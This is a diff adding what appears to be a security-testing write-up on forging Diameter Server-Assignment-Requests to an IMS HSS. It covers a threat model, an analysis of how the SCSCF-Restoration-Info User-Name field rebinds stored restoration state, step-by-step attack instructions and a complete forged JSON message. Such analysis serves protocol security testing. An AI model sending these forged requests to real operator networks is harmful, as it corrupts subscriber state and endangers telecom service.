@@ -1,0 +1,132 @@
+**Threat Model:**
+- **Attack Assumption:**
+  - The exposed victim is the **HSS** on the **Cx** interface.
+  - The attacker can impersonate the normal **S-CSCF / Diameter Multimedia client** role and send forged **Server-Assignment-Request (SAR)** messages to the HSS over an unauthenticated Diameter connection.
+  - The attacker knows a valid target **Public User Identity** and, if needed, candidate **Private User Identity** values relevant to that IMS subscription.
+
+- **Attacker Capability:**
+  - The attacker can send crafted SAR requests and receive the corresponding SAA responses on its own connection to the HSS.
+  - The attacker cannot observe or interfere with legitimate S-CSCF<->HSS traffic and cannot directly realize IMS service handling itself.
+  - The analysis is limited to whether manipulating **`SCSCF-Restoration-Info.User-Name`** in the forged SAR creates a distinct field-driven effect beyond generic SAR spoofing.
+
+**Exploitability Analysis:**
+`SCSCF-Restoration-Info.User-Name` is not mere descriptive metadata. In SAR, it is the mandatory key inside the grouped `SCSCF-Restoration-Info` structure, and the HSS uses it to associate the enclosed `Restoration-Info` set with a particular **Private User Identity**. The standards evidence also states that where multiple restoration groups exist for one Public User Identity, **one group corresponds to one Private User Identity**. That makes this field the discriminator for which per-private-identity restoration record is created or overwritten.
+
+The HSS stores `SCSCF-Restoration-Info` for applicable server-assignment procedures and can later return the stored groups to the S-CSCF during restoration retrieval, such as after S-CSCF restart with `NO_ASSIGNMENT`. The sibling `Restoration-Info` elements contain operational SIP registration state (`Path`, `Contact`, optionally `Subscription-Info`) that the recovering S-CSCF uses to handle requests for the user. Therefore, changing the inner `User-Name` can change **which private identity becomes bound to a given restoration dataset** in HSS state, and that altered binding can later affect which restoration context is returned and used after restart.
+
+This is a narrower effect than manipulating `Path` or `Contact`, but it is still field-specific. The impact is not just "a forged SAR can change HSS state"; rather, this field specifically selects the **private-identity slot** within that state. If the target Public User Identity is associated with multiple Private User Identities, changing this field can cause mis-association of restoration data across those identities, leading to incorrect restoration context after later S-CSCF recovery. That is a concrete stored-state corruption effect attributable to this field itself.
+
+The main limitation is validation. If the HSS strictly rejects any inner `User-Name` not belonging to the same subscription or not valid for the public identity context, then arbitrary cross-subscriber rebinding would fail. But the evidence still supports exploitability where the attacker uses an alternate syntactically valid and subscription-consistent Private User Identity within the same multi-identity IMS subscription. In that case, the forged value can still alter which keyed restoration record is stored, which is a meaningful field-driven effect.
+
+Recovery is not immediate. The bad state persists until legitimate SAR overwrite, deregistration/state-change clearing, or fresh registration/backup updates occur. That persistence is sufficient for a later restoration event to consume the corrupted mapping.
+
+**Attack Procedure:**
+1. Establish a Diameter connection to the target HSS while impersonating an S-CSCF.
+2. Send a minimal but coherent **Server-Assignment-Request** for a known subscriber context, including only mandatory top-level AVPs and the grouped AVPs required to make `SCSCF-Restoration-Info.User-Name` meaningful.
+3. Include:
+   - a valid target `Public-Identity`,
+   - coherent `Server-Name`,
+   - a `Server-Assignment-Type` value under which the HSS stores restoration information,
+   - one `SCSCF-Restoration-Info` group containing:
+     - the target field `User-Name` set to a **different but plausible Private User Identity** for the same subscriber context,
+     - at least one `Restoration-Info` child with syntactically valid `Path` and `Contact`.
+4. The malicious test value is the inner **`SCSCF-Restoration-Info.User-Name`**:
+   - e.g. `sip:impi-secondary@ims.mnc001.mcc001.3gppnetwork.org`
+   - while the SAR outer subscriber context targets a shared Public User Identity.
+5. Expected success condition:
+   - the HSS accepts and stores the restoration group;
+   - on a later restoration retrieval procedure, the HSS returns restoration data under the altered Private User Identity grouping, demonstrating field-driven rebinding of stored restoration state.
+
+Only coherence-related fields are included below; unrelated AVPs are omitted.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 301,
+    "application_id": 16777216,
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "attacker.scscf.example.net;1710000001;1"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777216
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "scscf1.attacker.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "attacker.example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "ims.operator.example"
+    },
+    {
+      "avp_name": "Public-Identity",
+      "avp_value": "sip:alice@ims.operator.example"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "sip:impi-primary@ims.operator.example"
+    },
+    {
+      "avp_name": "Server-Name",
+      "avp_value": "sip:scscf1.attacker.example.net"
+    },
+    {
+      "avp_name": "Server-Assignment-Type",
+      "avp_value": "REGISTRATION"
+    },
+    {
+      "avp_name": "User-Data-Already-Available",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "SCSCF-Restoration-Info",
+      "grouped_avp": [
+        {
+          "avp_name": "User-Name",
+          "avp_value": "sip:impi-secondary@ims.operator.example"
+        },
+        {
+          "avp_name": "Restoration-Info",
+          "grouped_avp": [
+            {
+              "avp_name": "Path",
+              "avp_value": "<sip:p1.visited.example.net;lr>"
+            },
+            {
+              "avp_name": "Contact",
+              "avp_value": "<sip:alice@192.0.2.55:5060;transport=udp>"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
+```
+
+**Classification:**
+- `EXPLOITABLE`
